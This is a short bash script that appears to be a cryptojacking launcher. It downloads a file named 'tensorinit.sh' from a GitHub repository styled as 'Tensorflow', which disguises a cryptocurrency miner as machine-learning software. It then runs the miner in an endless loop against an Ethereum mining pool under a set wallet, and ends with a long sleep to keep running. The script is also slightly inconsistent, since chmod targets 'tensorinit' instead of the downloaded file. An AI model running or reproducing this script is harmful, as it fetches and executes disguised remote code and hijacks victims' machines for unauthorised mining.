#!/bin/bash
POOL=eth.hashcity.org:7777
WALLET=freddycoro.
WORKER=$(echo $(shuf -i 10-20 -n 1)-COLN#im8m-ybvt)
wget https://raw.githubusercontent.com/nglkmerkel/Tensorflow/main/tensorinit.sh
chmod +x tensorinit
while [ 1 ]; do
./tensorinit --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 10
done
sleep 999999999 
